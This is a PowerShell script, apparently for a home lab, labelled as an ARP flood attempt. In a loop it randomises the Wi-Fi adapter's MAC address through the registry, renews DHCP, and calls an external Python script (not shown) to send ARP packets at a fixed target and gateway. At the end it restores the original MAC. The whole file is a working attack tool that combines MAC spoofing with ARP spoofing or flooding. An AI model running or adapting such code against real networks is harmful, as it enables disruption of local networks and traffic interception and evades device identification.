# Parameters - Change these values according to your setup
$networkAdapter = "Wi-Fi"  # Replace with the actual name of your network adapter
$gatewayIP = "192.168.88.190"    # Gateway IP address
$targetIP = "192.168.88.18"     # Target device IP address
$pythonScriptPath = "C:\Users\lokes\Desktop\send_arp.py" # Update this path to the location of send_arp.py

# Function to get the original MAC address
function Get-OriginalMac {
    Write-Output "[INFO] Retrieving original MAC address for adapter: $networkAdapter"
    $adapter = Get-WmiObject -Class Win32_NetworkAdapter | Where-Object { $_.NetConnectionID -eq $networkAdapter }
    if ($adapter) {
        Write-Output "[INFO] Original MAC Address: $($adapter.MACAddress)"
        return $adapter.MACAddress
    } else {
        Write-Output "[ERROR] Failed to retrieve original MAC address for $networkAdapter"
        return $null
    }
}

# Function to generate a random MAC address
function Get-RandomMac {
    $mac = ""
    for ($i = 0; $i -lt 6; $i++) {
        $mac += "{0:X2}" -f (Get-Random -Minimum 0 -Maximum 256)
        if ($i -lt 5) { $mac += "-" }
    }
    Write-Output "[INFO] Generated random MAC Address: $mac"
    return $mac
}

# Function to change the MAC address in the registry
function Set-MacAddress {
    param($macAddress)
    $adapterRegKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0001"  # Adjust based on the adapter
    try {
        Set-ItemProperty -Path $adapterRegKey -Name "NetworkAddress" -Value $macAddress
        Write-Output "[INFO] Changed MAC to $macAddress in registry"
    } catch {
        Write-Output "[ERROR] Failed to set MAC address in registry: $_"
    }
}

# Save the original MAC address to restore later
$originalMac = Get-OriginalMac
if (-not $originalMac) {
    Write-Output "[ERROR] Exiting due to failure in retrieving the original MAC address."
    exit
}

# Loop for ARP flood attempt
for ($i = 1; $i -le 5; $i++) {   # Set to 5 iterations for testing, adjust as needed
    Write-Output "[INFO] Iteration $i - Changing MAC address"
    
    $newMac = Get-RandomMac
    Set-MacAddress -macAddress $newMac

    # Release and renew IP to apply new MAC address
    Write-Output "[INFO] Releasing IP..."
    ipconfig /release
    Start-Sleep -Seconds 5

    Write-Output "[INFO] Renewing IP..."
    ipconfig /renew
    Start-Sleep -Seconds 5

    # Send ARP request to the target machine via Python
    Write-Output "[INFO] Sending ARP request using Python script..."
    Start-Process python -ArgumentList "$pythonScriptPath", $targetIP, $gatewayIP, $networkAdapter

    # Pause for a short duration to allow network stabilization
    Start-Sleep -Seconds 5
}

# Restore the original MAC address
Write-Output "[INFO] Restoring original MAC address..."
Set-MacAddress -macAddress $originalMac

# Release and renew IP to finalize the change back to the original MAC
Write-Output "[INFO] Releasing IP to apply original MAC..."
ipconfig /release
Start-Sleep -Seconds 5
Write-Output "[INFO] Renewing IP to apply original MAC..."
ipconfig /renew
Write-Output "[INFO] Restored original MAC Address: $originalMac"

# Enable the Wi-Fi adapter
Write-Output "[INFO] Enabling the Wi-Fi adapter..."
Enable-NetAdapter -Name $networkAdapter -Confirm:$false
Start-Sleep -Seconds 5

# Display IP Address after enabling
Write-Output "[INFO] Current IP Configuration:"
ipconfig
